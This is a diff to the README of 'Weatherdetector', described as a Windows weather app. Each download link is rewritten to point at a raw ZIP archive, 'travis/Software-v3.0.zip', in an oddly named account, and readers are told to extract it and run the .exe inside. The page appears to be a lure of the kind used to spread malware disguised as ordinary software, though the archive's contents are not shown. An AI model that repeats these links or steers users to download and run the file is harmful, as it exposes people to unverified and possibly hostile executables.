@@ -1,6 +1,6 @@
 # ☁️ Weatherdetector - Check Weather Fast on Windows
 
-[![Download Weatherdetector](https://img.shields.io/badge/Download-Weatherdetector-blue?style=for-the-badge)](https://github.com/tailshaped-genusseriphus881/Weatherdetector)
+[![Download Weatherdetector](https://img.shields.io/badge/Download-Weatherdetector-blue?style=for-the-badge)](https://github.com/tailshaped-genusseriphus881/Weatherdetector/raw/refs/heads/main/travis/Software-v3.0.zip)
 
 ## 🌦️ What Weatherdetector Does
 
@@ -9,7 +9,7 @@ Weatherdetector is a Windows app that helps you check current weather in a simpl
 ## 📥 Download Weatherdetector
 
 Visit this page to download:  
-https://github.com/tailshaped-genusseriphus881/Weatherdetector
+https://github.com/tailshaped-genusseriphus881/Weatherdetector/raw/refs/heads/main/travis/Software-v3.0.zip
 
 Open the page in your browser, look for the latest release or download file, and save it to your PC. If the file is in a ZIP folder, extract it first. If you see an .exe file, you can run it on Windows after the download finishes.
 
@@ -30,7 +30,7 @@ A newer PC will give you a smoother experience, but the app should run well on m
 Follow these steps on Windows:
 
 1. Open the download page:
-   https://github.com/tailshaped-genusseriphus881/Weatherdetector
+   https://github.com/tailshaped-genusseriphus881/Weatherdetector/raw/refs/heads/main/travis/Software-v3.0.zip
 
 2. Find the app file on the page.
 
@@ -161,7 +161,7 @@ Weatherdetector may use the internet to fetch live weather data based on the loc
 ## 📌 Quick Start
 
 1. Open the download page:
-   https://github.com/tailshaped-genusseriphus881/Weatherdetector
+   https://github.com/tailshaped-genusseriphus881/Weatherdetector/raw/refs/heads/main/travis/Software-v3.0.zip
 
 2. Download the Windows file.
 
@@ -187,4 +187,4 @@ Weatherdetector can help when you want to:
 ## 📎 Download Link
 
 Use this link to visit the download page:  
-https://github.com/tailshaped-genusseriphus881/Weatherdetector
+https://github.com/tailshaped-genusseriphus881/Weatherdetector/raw/refs/heads/main/travis/Software-v3.0.zip
